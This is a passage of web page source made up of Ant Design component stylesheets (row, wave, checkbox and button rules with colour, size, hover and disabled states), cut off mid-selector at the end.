    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"] [class^="ant-row"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-row"] [class*=" ant-row"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-row"] [class*=" ant-row"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row {
      display: flex;
      flex-flow: row wrap;
      min-width: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row::before,
    :where(.css-dev-only-do-not-override-pr0fja).ant-row::after {
      display: flex;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-no-wrap {
      flex-wrap: nowrap;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-start {
      justify-content: flex-start;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-center {
      justify-content: center;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-end {
      justify-content: flex-end;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-space-between {
      justify-content: space-between;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-space-around {
      justify-content: space-around;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-space-evenly {
      justify-content: space-evenly;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-top {
      align-items: flex-start;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-middle {
      align-items: center;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-row-bottom {
      align-items: flex-end;
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="1018jhu" data-token-hash="icxjto" data-cache-path="icxjto|Wave-Wave|ant-wave|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"] [class^="ant-wave"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"] [class^="ant-wave"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"] [class*=" ant-wave"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"] [class*=" ant-wave"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"] [class^="ant-wave"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"] [class^="ant-wave"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"] [class*=" ant-wave"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"] [class*=" ant-wave"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"] [class^="ant-wave"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"] [class^="ant-wave"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-wave"] [class*=" ant-wave"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-wave"] [class*=" ant-wave"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-wave {
      position: absolute;
      background: transparent;
      pointer-events: none;
      box-sizing: border-box;
      color: var(--wave-color, #1677ff);
      box-shadow: 0 0 0 0 currentcolor;
      opacity: 0.2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-wave.wave-motion-appear {
      transition: box-shadow 0.4s cubic-bezier(0.08, 0.82, 0.17, 1), opacity 2s cubic-bezier(0.08, 0.82, 0.17, 1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-wave.wave-motion-appear-active {
      box-shadow: 0 0 0 6px currentcolor;
      opacity: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-wave.wave-motion-appear.wave-quick {
      transition: box-shadow 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.35s cubic-bezier(0.645, 0.045, 0.355, 1);
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="1914lm9" data-token-hash="icxjto" data-cache-path="icxjto|Checkbox-Checkbox|ant-checkbox|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"] [class^="ant-checkbox"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"] [class^="ant-checkbox"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"] [class*=" ant-checkbox"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"] [class*=" ant-checkbox"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"] [class^="ant-checkbox"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"] [class^="ant-checkbox"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"] [class*=" ant-checkbox"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"] [class*=" ant-checkbox"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"] [class^="ant-checkbox"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"] [class^="ant-checkbox"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-checkbox"] [class*=" ant-checkbox"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-checkbox"] [class*=" ant-checkbox"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-group {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      display: inline-flex;
      flex-wrap: wrap;
      column-gap: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-group>.ant-row {
      flex: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1.5714285714285714;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      display: inline-flex;
      align-items: baseline;
      cursor: pointer;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper:after {
      display: inline-block;
      width: 0;
      overflow: hidden;
      content: '\a0';
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper+.ant-checkbox-wrapper {
      margin-inline-start: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper.ant-checkbox-wrapper-in-form-item input[type="checkbox"] {
      width: 14px;
      height: 14px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      color: rgba(0, 0, 0, 0.88);
      font-size: 14px;
      line-height: 1;
      list-style: none;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      position: relative;
      white-space: nowrap;
      cursor: pointer;
      border-radius: 4px;
      align-self: center;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox .ant-checkbox-input {
      position: absolute;
      inset: 0;
      z-index: 1;
      cursor: pointer;
      opacity: 0;
      margin: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox .ant-checkbox-input:focus-visible+.ant-checkbox-inner {
      outline: 4px solid #91caff;
      outline-offset: 1px;
      transition: outline-offset 0s, outline 0s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox .ant-checkbox-inner {
      box-sizing: border-box;
      position: relative;
      top: 0;
      inset-inline-start: 0;
      display: block;
      width: 16px;
      height: 16px;
      direction: ltr;
      background-color: #ffffff;
      border: 1px solid #d9d9d9;
      border-radius: 4px;
      border-collapse: separate;
      transition: all 0.3s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox .ant-checkbox-inner:after {
      box-sizing: border-box;
      position: absolute;
      top: 50%;
      inset-inline-start: 21.5%;
      display: table;
      width: 5.7142857142857135px;
      height: 9.142857142857142px;
      border: 2px solid #fff;
      border-top: 0;
      border-inline-start: 0;
      transform: rotate(45deg) scale(0) translate(-50%, -50%);
      opacity: 0;
      content: "";
      transition: all 0.1s cubic-bezier(0.71, -0.46, 0.88, 0.6), opacity 0.1s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox+span {
      padding-inline-start: 8px;
      padding-inline-end: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-inner,
    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox:not(.ant-checkbox-disabled):hover .ant-checkbox-inner {
      border-color: #1677ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-checked:not(.ant-checkbox-disabled) .ant-checkbox-inner {
      background-color: #4096ff;
      border-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-checked:not(.ant-checkbox-disabled):after {
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-checked .ant-checkbox-inner {
      background-color: #1677ff;
      border-color: #1677ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-checked .ant-checkbox-inner:after {
      opacity: 1;
      transform: rotate(45deg) scale(1) translate(-50%, -50%);
      transition: all 0.2s cubic-bezier(0.12, 0.4, 0.29, 1.46) 0.1s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper-checked:not(.ant-checkbox-wrapper-disabled):hover .ant-checkbox-inner,
    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-checked:not(.ant-checkbox-disabled):hover .ant-checkbox-inner {
      background-color: #4096ff;
      border-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-indeterminate .ant-checkbox-inner {
      background-color: #ffffff;
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-indeterminate .ant-checkbox-inner:after {
      top: 50%;
      inset-inline-start: 50%;
      width: 8px;
      height: 8px;
      background-color: #1677ff;
      border: 0;
      transform: translate(-50%, -50%) scale(1);
      opacity: 1;
      content: "";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-wrapper-disabled {
      cursor: not-allowed;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-disabled .ant-checkbox-input {
      cursor: not-allowed;
      pointer-events: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-disabled .ant-checkbox-inner {
      background: rgba(0, 0, 0, 0.04);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-disabled .ant-checkbox-inner:after {
      border-color: rgba(0, 0, 0, 0.25);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-disabled:after {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-disabled+span {
      color: rgba(0, 0, 0, 0.25);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-checkbox-disabled.ant-checkbox-indeterminate .ant-checkbox-inner::after {
      background: rgba(0, 0, 0, 0.25);
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="r5w9x3" data-token-hash="icxjto" data-cache-path="icxjto|Button-Button|ant-btn|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"] [class^="ant-btn"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"] [class^="ant-btn"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"] [class*=" ant-btn"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"] [class*=" ant-btn"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"] [class^="ant-btn"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"] [class^="ant-btn"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"] [class*=" ant-btn"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"] [class*=" ant-btn"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"] [class^="ant-btn"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"] [class^="ant-btn"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-btn"] [class*=" ant-btn"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-btn"] [class*=" ant-btn"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn {
      outline: none;
      position: relative;
      display: inline-block;
      font-weight: 400;
      white-space: nowrap;
      text-align: center;
      background-image: none;
      background-color: transparent;
      border: 1px solid transparent;
      cursor: pointer;
      transition: all 0.2s cubic-bezier(0.645, 0.045, 0.355, 1);
      user-select: none;
      touch-action: manipulation;
      line-height: 1.5714285714285714;
      color: rgba(0, 0, 0, 0.88);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn:disabled>* {
      pointer-events: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn>span {
      display: inline-block;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn .ant-btn-icon {
      line-height: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn>.anticon+span,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn>span+.anticon {
      margin-inline-start: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn:not(.ant-btn-icon-only)>.ant-btn-icon.ant-btn-loading-icon,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn:not(.ant-btn-icon-only)>.ant-btn-icon:not(:last-child) {
      margin-inline-end: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn>a {
      color: currentColor;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn:not(:disabled):focus-visible {
      outline: 4px solid #91caff;
      outline-offset: 1px;
      transition: outline-offset 0s, outline 0s;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-two-chinese-chars::first-letter {
      letter-spacing: 0.34em;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-two-chinese-chars>*:not(.anticon) {
      margin-inline-end: -0.34em;
      letter-spacing: 0.34em;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-icon-only.ant-btn-compact-item {
      flex: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-compact-item.ant-btn-primary:not([disabled])+.ant-btn-compact-item.ant-btn-primary:not([disabled]) {
      position: relative;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-compact-item.ant-btn-primary:not([disabled])+.ant-btn-compact-item.ant-btn-primary:not([disabled]):before {
      position: absolute;
      top: -1px;
      inset-inline-start: -1px;
      display: inline-block;
      width: 1px;
      height: calc(100% + 2px);
      background-color: #4096ff;
      content: "";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-compact-vertical-item.ant-btn-primary:not([disabled])+.ant-btn-compact-vertical-item.ant-btn-primary:not([disabled]) {
      position: relative;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-compact-vertical-item.ant-btn-primary:not([disabled])+.ant-btn-compact-vertical-item.ant-btn-primary:not([disabled]):before {
      position: absolute;
      top: -1px;
      inset-inline-start: -1px;
      display: inline-block;
      width: calc(100% + 2px);
      height: 1px;
      background-color: #4096ff;
      content: "";
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-sm {
      font-size: 14px;
      height: 24px;
      padding: 0px 7px;
      border-radius: 4px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-sm.ant-btn-icon-only {
      width: 24px;
      padding-inline-start: 0;
      padding-inline-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-sm.ant-btn-icon-only.ant-btn-round {
      width: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-sm.ant-btn-icon-only .anticon {
      font-size: 14px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-sm.ant-btn-loading {
      opacity: 0.65;
      cursor: default;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-sm .ant-btn-loading-icon {
      transition: width 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-circle.ant-btn-sm {
      min-width: 24px;
      padding-inline-start: 0;
      padding-inline-end: 0;
      border-radius: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-round.ant-btn-sm {
      border-radius: 24px;
      padding-inline-start: 12px;
      padding-inline-end: 12px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn {
      font-size: 14px;
      height: 32px;
      padding: 4px 15px;
      border-radius: 6px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-icon-only {
      width: 32px;
      padding-inline-start: 0;
      padding-inline-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-icon-only.ant-btn-round {
      width: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-icon-only .anticon {
      font-size: 16px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-loading {
      opacity: 0.65;
      cursor: default;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn .ant-btn-loading-icon {
      transition: width 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-circle {
      min-width: 32px;
      padding-inline-start: 0;
      padding-inline-end: 0;
      border-radius: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-round {
      border-radius: 32px;
      padding-inline-start: 16px;
      padding-inline-end: 16px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-lg {
      font-size: 16px;
      height: 40px;
      padding: 6.428571428571429px 15px;
      border-radius: 8px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-lg.ant-btn-icon-only {
      width: 40px;
      padding-inline-start: 0;
      padding-inline-end: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-lg.ant-btn-icon-only.ant-btn-round {
      width: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-lg.ant-btn-icon-only .anticon {
      font-size: 18px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-lg.ant-btn-loading {
      opacity: 0.65;
      cursor: default;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-lg .ant-btn-loading-icon {
      transition: width 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-circle.ant-btn-lg {
      min-width: 40px;
      padding-inline-start: 0;
      padding-inline-end: 0;
      border-radius: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-round.ant-btn-lg {
      border-radius: 40px;
      padding-inline-start: 20px;
      padding-inline-end: 20px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn.ant-btn-block {
      width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default {
      background-color: #ffffff;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.88);
      box-shadow: 0 2px 0 rgba(0, 0, 0, 0.02);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-disabled {
      cursor: not-allowed;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default:not(:disabled):not(.ant-btn-disabled):hover {
      color: #4096ff;
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default:not(:disabled):not(.ant-btn-disabled):active {
      color: #0958d9;
      border-color: #0958d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-background-ghost {
      color: #ffffff;
      background-color: transparent;
      border-color: #ffffff;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):active {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-background-ghost:disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous {
      color: #ff4d4f;
      border-color: #ff4d4f;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):hover {
      color: #ff7875;
      border-color: #ffa39e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):active {
      color: #d9363e;
      border-color: #d9363e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost {
      color: #ff4d4f;
      background-color: transparent;
      border-color: #ff4d4f;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):active {
      background-color: transparent;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost:disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-default.ant-btn-dangerous.ant-btn-disabled {
      cursor: not-allowed;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary {
      color: #fff;
      background-color: #1677ff;
      box-shadow: 0 2px 0 rgba(5, 145, 255, 0.1);
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-disabled {
      cursor: not-allowed;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary:not(:disabled):not(.ant-btn-disabled):hover {
      color: #fff;
      background-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary:not(:disabled):not(.ant-btn-disabled):active {
      color: #fff;
      background-color: #0958d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-background-ghost {
      color: #1677ff;
      background-color: transparent;
      border-color: #1677ff;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: transparent;
      color: #4096ff;
      border-color: #4096ff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):active {
      background-color: transparent;
      color: #0958d9;
      border-color: #0958d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-background-ghost:disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous {
      background-color: #ff4d4f;
      box-shadow: 0 2px 0 rgba(255, 38, 5, 0.06);
      color: #fff;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: #ff7875;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous:not(:disabled):not(.ant-btn-disabled):active {
      background-color: #d9363e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost {
      color: #ff4d4f;
      background-color: transparent;
      border-color: #ff4d4f;
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):hover {
      background-color: transparent;
      color: #ff7875;
      border-color: #ff7875;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):not(.ant-btn-disabled):active {
      background-color: transparent;
      color: #d9363e;
      border-color: #d9363e;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost:disabled {
      cursor: not-allowed;
      color: rgba(0, 0, 0, 0.25);
      border-color: #d9d9d9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous:disabled,
    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-primary.ant-btn-dangerous.ant-btn-disabled {
      cursor: not-allowed;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.25);
      background-color: rgba(0, 0, 0, 0.04);
      box-shadow: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed {
      background-color: #ffffff;
      border-color: #d9d9d9;
      color: rgba(0, 0, 0, 0.88);
      box-shadow: 0 2px 0 rgba(0, 0, 0, 0.02);
      border-style: dashed;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-btn-dashed:disabled,
